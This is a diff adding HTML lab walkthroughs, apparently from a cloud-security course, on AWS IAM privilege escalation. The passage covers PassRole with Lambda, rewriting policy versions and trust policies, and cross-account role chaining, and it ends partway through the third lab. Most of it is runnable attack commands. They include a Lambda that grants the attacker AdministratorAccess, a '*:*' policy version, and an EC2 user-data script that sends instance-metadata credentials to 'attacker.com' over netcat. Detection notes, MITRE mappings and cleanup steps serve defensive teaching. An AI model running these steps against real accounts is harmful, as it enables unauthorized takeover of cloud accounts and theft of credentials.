@@ -1,0 +1,911 @@
+<!-- M16: IAM Privilege Escalation — Expert Tier Labs -->
+<!-- DISCLAIMER: This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test. -->
+
+<div class="lab-walkthrough-content" id="M16-L01-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Escalate to full administrator by combining <code>iam:PassRole</code> and <code>lambda:CreateFunction</code> permissions to execute code as an admin IAM role.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS CLI configured with a low-privilege IAM user or role (e.g., <code>dev-user</code>)</li>
+      <li>The principal must have <code>iam:PassRole</code>, <code>lambda:CreateFunction</code>, and <code>lambda:InvokeFunction</code> permissions</li>
+      <li>At least one IAM role with <code>lambda.amazonaws.com</code> in its trust policy and admin-level permissions</li>
+      <li>Python 3 to create the Lambda deployment package</li>
+    </ul>
+  </div>
+
+  <div class="warning">
+    <i class="fa-solid fa-triangle-exclamation"></i> <strong>Authorized testing only.</strong> IAM privilege escalation techniques can grant full account access. Only perform on AWS accounts you control or have explicit written permission to test.
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Confirm the current user has <code>iam:PassRole</code> and <code>lambda:CreateFunction</code> permissions. This combination is one of the most common IAM privilege escalation paths.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam simulate-principal-policy \
+    --policy-source-arn arn:aws:iam::123456789012:user/dev-user \
+    --action-names iam:PassRole lambda:CreateFunction lambda:InvokeFunction \
+    --query 'EvaluationResults[*].{Action:EvalActionName,Decision:EvalDecision}'</div>
+            <div class="terminal-output">[
+    {"Action": "iam:PassRole", "Decision": "allowed"},
+    {"Action": "lambda:CreateFunction", "Decision": "allowed"},
+    {"Action": "lambda:InvokeFunction", "Decision": "allowed"}
+]</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Find an IAM role with administrator-level permissions that can be passed to Lambda. Any role with a trust policy allowing <code>lambda.amazonaws.com</code> is a target.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam list-roles \
+    --query 'Roles[?contains(RoleName,`Admin`) || contains(RoleName,`admin`)].[RoleName,Arn]' \
+    --output table</div>
+            <div class="terminal-output">----------------------------------------------------------------------
+|                           ListRoles                                |
++---------------------------+----------------------------------------+
+|  LambdaAdminRole          |  arn:aws:iam::123456789012:role/LambdaAdminRole        |
+|  AdminAccessRole          |  arn:aws:iam::123456789012:role/AdminAccessRole        |
++---------------------------+----------------------------------------+</div>
+            <div class="terminal-cmd">$ aws iam get-role --role-name LambdaAdminRole \
+    --query 'Role.AssumeRolePolicyDocument'</div>
+            <div class="terminal-output">{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": {"Service": "lambda.amazonaws.com"},
+            "Action": "sts:AssumeRole"
+        }
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Create the privilege escalation Lambda function code. This function will attach the AdministratorAccess policy to the attacker's user when invoked.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat > /tmp/index.py &lt;&lt;'PYEOF'
+import boto3
+import json
+
+def handler(event, context):
+    client = boto3.client('iam')
+
+    # Attach admin policy to attacker user
+    client.attach_user_policy(
+        UserName='dev-user',
+        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
+    )
+
+    return {
+        'statusCode': 200,
+        'body': json.dumps({'message': 'Escalation complete', 'user': 'dev-user'})
+    }
+PYEOF
+$ cd /tmp && zip escalate.zip index.py</div>
+            <div class="terminal-output">  adding: index.py (deflated 42%)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Create the Lambda function, passing the admin role. The <code>iam:PassRole</code> permission allows associating the high-privilege role with the function.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws lambda create-function \
+    --function-name escalate-privs \
+    --runtime python3.12 \
+    --role arn:aws:iam::123456789012:role/LambdaAdminRole \
+    --handler index.handler \
+    --zip-file fileb:///tmp/escalate.zip \
+    --timeout 30</div>
+            <div class="terminal-output">{
+    "FunctionName": "escalate-privs",
+    "FunctionArn": "arn:aws:lambda:us-east-1:123456789012:function:escalate-privs",
+    "Runtime": "python3.12",
+    "Role": "arn:aws:iam::123456789012:role/LambdaAdminRole",
+    "Handler": "index.handler",
+    "CodeSize": 347,
+    "Timeout": 30,
+    "State": "Active"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Invoke the function. It executes as the admin role and attaches AdministratorAccess to the attacker's user. Verify the escalation succeeded.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws lambda invoke --function-name escalate-privs /tmp/output.json && cat /tmp/output.json</div>
+            <div class="terminal-output">{
+    "StatusCode": 200,
+    "ExecutedVersion": "$LATEST"
+}
+{"statusCode": 200, "body": "{\"message\": \"Escalation complete\", \"user\": \"dev-user\"}"}</div>
+            <div class="terminal-cmd">$ aws iam list-attached-user-policies --user-name dev-user</div>
+            <div class="terminal-output">{
+    "AttachedPolicies": [
+        {
+            "PolicyName": "DeveloperPolicy",
+            "PolicyArn": "arn:aws:iam::123456789012:policy/DeveloperPolicy"
+        },
+        {
+            "PolicyName": "AdministratorAccess",
+            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
+        }
+    ]
+}</div>
+            <div class="terminal-cmd">$ # Full admin confirmed — list account users
+aws iam list-users --query 'Users | length(@)'</div>
+            <div class="terminal-output">47</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">6</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Additional escalation paths via iam:PassRole.</strong> Beyond Lambda, <code>iam:PassRole</code> combined with <code>ec2:RunInstances</code> allows launching an EC2 instance with an admin IAM instance profile and exfiltrating credentials via user-data or IMDS.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Launch EC2 with admin instance profile — credentials available at IMDS inside the instance
+aws ec2 run-instances \
+    --image-id ami-0c02fb55956c7d316 \
+    --instance-type t3.micro \
+    --iam-instance-profile Name=AdminProfile \
+    --user-data '#!/bin/bash
+TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H X-aws-ec2-metadata-token-ttl-seconds:21600)
+ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE | \
+  nc attacker.com 4444' \
+    --query 'Instances[0].InstanceId'</div>
+            <div class="terminal-output">"i-0a1b2c3d4e5f6a7b8"</div>
+            <div class="terminal-cmd">$ # On attacker listener — wait for admin credentials to arrive
+nc -nlvp 4444</div>
+            <div class="terminal-output">{
+  "AccessKeyId": "ASIAIOSFODNN7ADMIN",
+  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/AdminSecret",
+  "Token": "FwoGZXIvYXdz...",
+  "Expiration": "2026-04-02T22:00:00Z"
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">PassRole + CreateFunction</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Lambda runs as Admin</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Attaches Admin Policy</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full Admin</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>CloudTrail: <code>lambda:CreateFunction</code> by a non-admin principal with an admin-class role ARN in <code>Role</code> field — high fidelity signal</li>
+      <li>CloudTrail: <code>iam:AttachUserPolicy</code> where the policy ARN is <code>arn:aws:iam::aws:policy/AdministratorAccess</code></li>
+      <li>Alert on <code>sts:AssumeRole</code> where the principal is <code>lambda.amazonaws.com</code> for roles not in the expected Lambda role list</li>
+      <li>Alert on <code>ec2:RunInstances</code> with an IAM instance profile whose role has admin-level permissions, called by a non-admin principal</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.004</strong> — Valid Accounts: Cloud Accounts (IAM user with escalated permissions)</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+      <li><strong>T1098.003</strong> — Account Manipulation: Additional Cloud Roles (AttachUserPolicy)</li>
+      <li><strong>T1552.005</strong> — Unsecured Credentials: Cloud Instance Metadata API (EC2 + IMDS exfil)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Delete Lambda: <code>aws lambda delete-function --function-name escalate-privs</code></li>
+      <li>Detach admin policy: <code>aws iam detach-user-policy --user-name dev-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></li>
+      <li>Terminate EC2 instance: <code>aws ec2 terminate-instances --instance-ids i-0a1b2c3d4e5f6a7b8</code></li>
+      <li>Review CloudTrail for all API calls made with the escalated credentials</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-circle-info"></i> The <code>iam:PassRole</code> permission is a force multiplier. Restrict it with resource conditions to limit which roles can be passed: <code>"Resource": "arn:aws:iam::*:role/lambda-specific-*"</code>. Never allow PassRole on wildcard roles.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M16-L02-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Escalate privileges using three distinct IAM paths: (1) creating a new policy version with wildcard permissions, (2) modifying a role trust policy to allow assumption, and (3) attaching AdministratorAccess to an existing role.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS CLI configured with a low-privilege IAM user</li>
+      <li>The user must have one or more of: <code>iam:CreatePolicyVersion</code>, <code>iam:UpdateAssumeRolePolicy</code>, or <code>iam:AttachRolePolicy</code></li>
+      <li>At least one customer-managed IAM policy attached to the user or an assumable role in the account</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">List customer-managed policies in the account. These are the policies you can potentially modify — AWS-managed policies cannot be versioned by users.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam list-policies --scope Local \
+    --query 'Policies[*].[PolicyName,Arn,AttachmentCount]' --output table</div>
+            <div class="terminal-output">----------------------------------------------------------------------
+|                          ListPolicies                              |
++-------------------------+-------------------------------------------+---+
+|  DeveloperPolicy        |  arn:aws:iam::123456789012:policy/DeveloperPolicy       |  3 |
+|  CICDPipelinePolicy     |  arn:aws:iam::123456789012:policy/CICDPipelinePolicy    |  2 |
+|  DataAnalystPolicy      |  arn:aws:iam::123456789012:policy/DataAnalystPolicy     |  5 |
++-------------------------+-------------------------------------------+---+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Path 1: iam:CreatePolicyVersion with set-as-default.</strong> Create a new policy version with wildcard permissions and immediately set it as the default. This escalation takes effect for all principals the policy is attached to.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Check current versions (max 5 — delete one if at limit)
+aws iam list-policy-versions \
+    --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy</div>
+            <div class="terminal-output">{
+    "Versions": [
+        {"VersionId": "v1", "IsDefaultVersion": true, "CreateDate": "2024-06-15T10:00:00Z"}
+    ]
+}</div>
+            <div class="terminal-cmd">$ aws iam create-policy-version \
+    --policy-arn arn:aws:iam::123456789012:policy/DeveloperPolicy \
+    --policy-document '{
+        "Version": "2012-10-17",
+        "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
+    }' \
+    --set-as-default</div>
+            <div class="terminal-output">{
+    "PolicyVersion": {
+        "VersionId": "v2",
+        "IsDefaultVersion": true,
+        "CreateDate": "2026-04-02T15:00:00Z"
+    }
+}</div>
+            <div class="terminal-cmd">$ # IMPORTANT: isDefaultVersion=true in the CLI call is what makes this instant
+# Verify — the policy now grants wildcard permissions to all 3 attached entities
+aws iam list-users --query 'Users | length(@)'</div>
+            <div class="terminal-output">47</div>
+          </div>
+        </div>
+        <div class="note"><strong>Detection trigger:</strong> <code>CreatePolicyVersion</code> with <code>isDefaultVersion=true</code> is a critical CloudTrail event. The combination of this flag plus a wildcard <code>Action: *</code> document body should be an immediate P0 alert.</div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Path 2: iam:UpdateAssumeRolePolicy — modify a role's trust policy.</strong> If you can update the trust policy (assume role policy document) of a privileged role, you can add yourself as a trusted principal and directly assume it.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Find a high-privilege role — e.g., one with AdministratorAccess attached
+aws iam list-roles --query \
+    'Roles[?contains(RoleName,`Admin`)].[RoleName,Arn]' \
+    --output text</div>
+            <div class="terminal-output">AdminAccessRole  arn:aws:iam::123456789012:role/AdminAccessRole</div>
+            <div class="terminal-cmd">$ # Modify the trust policy to add our attacker user as a trusted principal
+aws iam update-assume-role-policy \
+    --role-name AdminAccessRole \
+    --policy-document '{
+        "Version": "2012-10-17",
+        "Statement": [
+            {
+                "Effect": "Allow",
+                "Principal": {
+                    "AWS": [
+                        "arn:aws:iam::123456789012:root",
+                        "arn:aws:iam::123456789012:user/dev-user"
+                    ]
+                },
+                "Action": "sts:AssumeRole"
+            }
+        ]
+    }'</div>
+            <div class="terminal-output"></div>
+            <div class="terminal-cmd">$ # Now assume the admin role directly
+aws sts assume-role \
+    --role-arn arn:aws:iam::123456789012:role/AdminAccessRole \
+    --role-session-name privesc \
+    --query 'Credentials.AccessKeyId'</div>
+            <div class="terminal-output">"ASIAIOSFODNN7ADMINRL"</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc"><strong>Path 3: iam:AttachRolePolicy — attach AdministratorAccess to a role you can assume.</strong> If you can attach policies to a role, attach the AWS-managed AdministratorAccess policy, then assume that role.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Find a role you can already assume (it has your user in its trust policy)
+aws sts assume-role \
+    --role-arn arn:aws:iam::123456789012:role/staging-deploy-role \
+    --role-session-name test-assume 2>&1 | grep -q AccessKeyId && echo "Assumable"</div>
+            <div class="terminal-output">Assumable</div>
+            <div class="terminal-cmd">$ # Attach AdministratorAccess to this role (requires iam:AttachRolePolicy)
+aws iam attach-role-policy \
+    --role-name staging-deploy-role \
+    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</div>
+            <div class="terminal-output"></div>
+            <div class="terminal-cmd">$ # Now assume the role — it now has admin permissions
+CREDS=$(aws sts assume-role \
+    --role-arn arn:aws:iam::123456789012:role/staging-deploy-role \
+    --role-session-name escalated)
+export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.Credentials.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.Credentials.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Credentials.SessionToken')
+aws sts get-caller-identity</div>
+            <div class="terminal-output">{
+    "UserId": "AROA3XFRBF23STAGING:escalated",
+    "Account": "123456789012",
+    "Arn": "arn:aws:sts::123456789012:assumed-role/staging-deploy-role/escalated"
+}</div>
+            <div class="terminal-cmd">$ aws s3 ls | wc -l</div>
+            <div class="terminal-output">15</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Confirm full admin access and note role chaining session duration limits.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws iam list-users --query 'Users | length(@)'</div>
+            <div class="terminal-output">47</div>
+            <div class="terminal-cmd">$ aws s3 ls | head -3</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-data-bucket
+2024-02-15 14:33:22 prod-financial-reports
+2024-03-01 09:11:44 prod-backups-encrypted</div>
+            <div class="terminal-cmd">$ # IMPORTANT: Role chaining session duration cap
+# When you assume Role A, then assume Role B from Role A's session,
+# the final session is CAPPED at 1 hour regardless of MaxSessionDuration.
+# This applies even if Role B has MaxSessionDuration=12h.
+# Direct role assumption (user -> role) respects MaxSessionDuration.
+echo "Role chaining cap: 1 hour max session (STS limitation)"</div>
+            <div class="terminal-output">Role chaining cap: 1 hour max session (STS limitation)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">CreatePolicyVersion *:*</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Set as Default</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Instant Admin</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node highlight">Full Account Control</div>
+    </div>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-solid fa-shield-halved"></i> Detection Notes</strong></div>
+    <ul>
+      <li>CloudTrail: <code>iam:CreatePolicyVersion</code> with <code>isDefaultVersion: true</code> and a wildcard Action document — P0 alert</li>
+      <li>CloudTrail: <code>iam:UpdateAssumeRolePolicy</code> on a privileged role adding a non-service principal</li>
+      <li>CloudTrail: <code>iam:AttachRolePolicy</code> with <code>PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess</code> or <code>PowerUserAccess</code></li>
+      <li>CloudTrail: <code>iam:AttachUserPolicy</code> on self (user attaching policy to their own user ARN)</li>
+      <li>Use AWS Config rule <code>iam-no-inline-policy-check</code> and custom Config rules to alert on wildcard policy documents</li>
+    </ul>
+  </div>
+
+  <div class="lab-section">
+    <div class="lab-meta"><strong><i class="fa-brands fa-adversal"></i> MITRE ATT&amp;CK Mapping</strong></div>
+    <ul>
+      <li><strong>T1078.004</strong> — Valid Accounts: Cloud Accounts</li>
+      <li><strong>T1548.005</strong> — Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access</li>
+      <li><strong>T1098.003</strong> — Account Manipulation: Additional Cloud Roles</li>
+      <li><strong>T1580</strong> — Cloud Infrastructure Discovery (enumerate roles, policies)</li>
+    </ul>
+  </div>
+
+  <div class="cleanup">
+    <strong><i class="fa-solid fa-broom"></i> Cleanup</strong>
+    <ul>
+      <li>Revert policy version: <code>aws iam set-default-policy-version --policy-arn &lt;arn&gt; --version-id v1</code> then delete v2: <code>aws iam delete-policy-version --policy-arn &lt;arn&gt; --version-id v2</code></li>
+      <li>Revert trust policy on AdminAccessRole to its original document</li>
+      <li>Detach AdministratorAccess from staging-deploy-role: <code>aws iam detach-role-policy --role-name staging-deploy-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess</code></li>
+      <li>Review CloudTrail for all API calls made with escalated sessions</li>
+    </ul>
+  </div>
+
+  <div class="lab-note">
+    <i class="fa-solid fa-triangle-exclamation"></i> <code>iam:CreatePolicyVersion</code> is one of the most dangerous permissions in AWS — it can rewrite any customer-managed policy. Use SCPs to deny this action except from specific admin roles, and monitor CloudTrail for <code>CreatePolicyVersion</code> events with wildcard action documents. Similarly, <code>iam:UpdateAssumeRolePolicy</code> and <code>iam:AttachRolePolicy</code> on privileged roles should require MFA and be restricted by SCP.
+  </div>
+</div>
+
+<hr class="lab-divider">
+
+<div class="lab-walkthrough-content" id="M16-L03-content">
+  <div class="lab-objective">
+    <i class="fa-solid fa-crosshairs"></i>
+    <strong>Objective:</strong> Enumerate all assumable IAM roles across the organization and chain multiple role assumptions to reach highest-privilege access in production. Understand the 1-hour role chaining session cap and how to work around it.
+  </div>
+
+  <div class="prereq">
+    <strong><i class="fa-solid fa-list-check"></i> Prerequisites</strong>
+    <ul>
+      <li>AWS CLI with credentials for a low-privilege IAM user or role</li>
+      <li>Pacu installed: <code>pip install pacu</code> or from GitHub</li>
+      <li>Access to test cross-account trust relationships (lab environment with multiple accounts)</li>
+      <li>Understanding of STS role chaining session duration limits</li>
+    </ul>
+  </div>
+
+  <div class="lab-steps">
+
+    <div class="lab-step">
+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Enumerate roles that allow assumption from the current principal. Try assuming each discovered role to map the trust graph.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Attempt to assume each known role — enumerate assumable roles
+for role_arn in $(aws iam list-roles --query 'Roles[*].Arn' --output text); do
+    ROLE_NAME=$(echo "$role_arn" | awk -F/ '{print $NF}')
+    RESULT=$(aws sts assume-role --role-arn "$role_arn" \
+        --role-session-name enum-test 2>&1)
+    if echo "$RESULT" | grep -q "AccessKeyId"; then
+        echo "[ASSUMABLE] $ROLE_NAME ($role_arn)"
+    fi
+done 2>/dev/null</div>
+            <div class="terminal-output">[ASSUMABLE] dev-readonly-role (arn:aws:iam::123456789012:role/dev-readonly-role)
+[ASSUMABLE] staging-deploy-role (arn:aws:iam::123456789012:role/staging-deploy-role)
+[ASSUMABLE] cross-account-audit (arn:aws:iam::123456789012:role/cross-account-audit)</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Automate cross-account role enumeration using Pacu, the AWS exploitation framework. It can discover roles across multiple accounts.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ pacu
+Pacu (dev-user:123456789012) > run iam__enum_roles</div>
+            <div class="terminal-output">[iam__enum_roles] Starting role enumeration...
+[iam__enum_roles] Checking 234567890123 (staging account)...
+[iam__enum_roles]   Found: arn:aws:iam::234567890123:role/staging-admin
+[iam__enum_roles]   Found: arn:aws:iam::234567890123:role/staging-deployer
+[iam__enum_roles] Checking 345678901234 (production account)...
+[iam__enum_roles]   Found: arn:aws:iam::345678901234:role/prod-readonly
+[iam__enum_roles] 3 assumable roles found across 2 accounts</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Chain role assumptions: start from the dev role, assume into staging, then pivot to production. Each hop uses the credentials from the previous role.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Hop 1: Current user -> dev-readonly-role
+CREDS1=$(aws sts assume-role \
+    --role-arn arn:aws:iam::123456789012:role/dev-readonly-role \
+    --role-session-name hop1 --query 'Credentials')
+export AWS_ACCESS_KEY_ID=$(echo $CREDS1 | jq -r '.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS1 | jq -r '.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $CREDS1 | jq -r '.SessionToken')
+echo "Hop 1: $(aws sts get-caller-identity --query 'Arn' --output text)"</div>
+            <div class="terminal-output">Hop 1: arn:aws:sts::123456789012:assumed-role/dev-readonly-role/hop1</div>
+            <div class="terminal-cmd">$ # Hop 2: dev-readonly -> staging-admin (cross-account)
+CREDS2=$(aws sts assume-role \
+    --role-arn arn:aws:iam::234567890123:role/staging-admin \
+    --role-session-name hop2 --query 'Credentials')
+export AWS_ACCESS_KEY_ID=$(echo $CREDS2 | jq -r '.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS2 | jq -r '.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $CREDS2 | jq -r '.SessionToken')
+echo "Hop 2: $(aws sts get-caller-identity --query 'Arn' --output text)"</div>
+            <div class="terminal-output">Hop 2: arn:aws:sts::234567890123:assumed-role/staging-admin/hop2</div>
+            <div class="terminal-cmd">$ # Hop 3: staging-admin -> prod-admin (cross-account)
+CREDS3=$(aws sts assume-role \
+    --role-arn arn:aws:iam::345678901234:role/prod-admin \
+    --role-session-name hop3 --query 'Credentials')
+export AWS_ACCESS_KEY_ID=$(echo $CREDS3 | jq -r '.AccessKeyId')
+export AWS_SECRET_ACCESS_KEY=$(echo $CREDS3 | jq -r '.SecretAccessKey')
+export AWS_SESSION_TOKEN=$(echo $CREDS3 | jq -r '.SessionToken')
+echo "Hop 3: $(aws sts get-caller-identity --query 'Arn' --output text)"</div>
+            <div class="terminal-output">Hop 3: arn:aws:sts::345678901234:assumed-role/prod-admin/hop3</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Map the full trust graph across accounts to visualize all possible role chaining paths. Understand the 1-hour session cap that applies to chained (role-to-role) assumptions.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ echo "=== ROLE CHAIN MAP ==="</div>
+            <div class="terminal-output">=== ROLE CHAIN MAP ===
+
+dev-user (123456789012)
+  |-- dev-readonly-role (123456789012)
+  |   \-- staging-admin (234567890123)
+  |       \-- prod-admin (345678901234)  <- FULL PROD ACCESS
+  |-- staging-deploy-role (123456789012)
+  |   \-- staging-admin (234567890123)
+  \-- cross-account-audit (123456789012)
+      \-- security-audit (456789012345)
+
+Shortest path to prod-admin: 3 hops
+  dev-user -> dev-readonly -> staging-admin -> prod-admin
+
+IMPORTANT: Role chaining session duration cap
+  - Direct assumption (user -> role): respects role's MaxSessionDuration (up to 12h)
+  - Role chaining (role -> role): ALWAYS capped at 1 hour, regardless of MaxSessionDuration
+  - This means all sessions beyond hop1 expire in ≤1h</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Confirm production admin access via the role chain. Enumerate high-value resources in the production account.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ # Using prod-admin creds from hop 3
+aws s3 ls --region us-east-1 | head -5</div>
+            <div class="terminal-output">2024-01-10 08:22:11 prod-customer-pii-bucket
+2024-02-15 14:33:22 prod-financial-data
+2024-03-01 09:11:44 prod-encrypted-backups
+2024-03-20 16:55:33 prod-application-artifacts
+2024-03-25 11:22:33 prod-ml-training-data</div>
+            <div class="terminal-cmd">$ aws rds describe-db-clusters \
+    --query 'DBClusters[*].[DBClusterIdentifier,Engine,Status]' --output table</div>
+            <div class="terminal-output">-----------------------------------------------------
+|               DescribeDBClusters                  |
++---------------------+----------+------------------+
+|  prod-main-cluster  |  aurora  |  available       |
+|  prod-analytics     |  aurora  |  available       |
++---------------------+----------+------------------+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">User</div>
